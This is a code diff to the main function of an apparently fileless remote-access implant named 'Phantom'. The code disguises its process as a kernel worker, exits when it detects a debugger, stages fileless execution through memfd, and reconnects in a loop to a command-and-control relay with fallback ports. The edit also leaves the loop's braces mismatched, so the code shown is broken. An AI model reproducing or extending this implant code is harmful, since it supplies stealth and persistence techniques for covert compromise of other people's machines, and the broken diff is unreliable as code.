@@ -14,6 +14,8 @@
 #include "memfd_loader.h"
 #include "utils.h"
 
+#define PHANTOM_VERSION "v1.0.1-stable"
+
 // NO ANSI COLORS - Plain text for web shells
 #define DPRINTF_FLUSH(fmt, ...) do { \
     dprintf(STDERR_FILENO, fmt, ##__VA_ARGS__); \
@@ -25,10 +27,8 @@ static void usage(const char *progname) {
 }
 
 int main(int argc, char *argv[]) {
-    char kworker_name[64];
-    decode_kworker(kworker_name, sizeof(kworker_name));
-    prctl(PR_SET_NAME, (unsigned long)kworker_name, 0, 0, 0);
-    masquerade_argv(argv, kworker_name);
+    // 1. Principal Masquerading
+    full_masquerade(argv, argc);
 
     char *secret = NULL;
     char *relay_host = NULL;
@@ -55,7 +55,7 @@ int main(int argc, char *argv[]) {
 
     uint16_t relay_port = (uint16_t)atoi(relay_port_str);
 
-    // Network Debug Output (BEFORE forking)
+    // 2. Network Debug Output (BEFORE forking)
     DPRINTF_FLUSH("[-] C2 Target: %s:%d\n", relay_host, relay_port);
     DPRINTF_FLUSH("[-] Resolving %s...\n", relay_host);
     DPRINTF_FLUSH("[-] Initializing Stealth Payload...\n");
@@ -64,6 +64,7 @@ int main(int argc, char *argv[]) {
     if (ph_stealth_anti_debug_comprehensive() != PH_STEALTH_OK) {
         _exit(0);
     }
+
 
     // Fileless Execution Staging
     ph_memfd_ctx_t memfd_ctx;
@@ -105,19 +106,20 @@ int main(int argc, char *argv[]) {
 
     ph_relay_manager_add(&net_ctx.relay_mgr, relay_host, relay_port, 1);
 
-    while (1) {
-        int ret = ph_network_connect(&net_ctx, relay_host, relay_port);
+        int ret = ph_network_connect_with_fallback(&net_ctx, relay_host);
         if (ret == PH_OK) {
-            DPRINTF_FLUSH("[+] TCP Connected.\n");
+            DPRINTF_FLUSH("[+] Agent Online (%s).\n", PHANTOM_VERSION);
             ph_reconnect_reset(&net_ctx.reconnect);
+
             
             // Handle connection...
         } else {
-            DPRINTF_FLUSH("[!] Connection failed, retrying...\n");
+            DPRINTF_FLUSH("[!] All C2 ports failed, retrying in backoff...\n");
         }
 
         ph_reconnect_attempt(&net_ctx.reconnect);
     }
+
 
     return 0;
 }
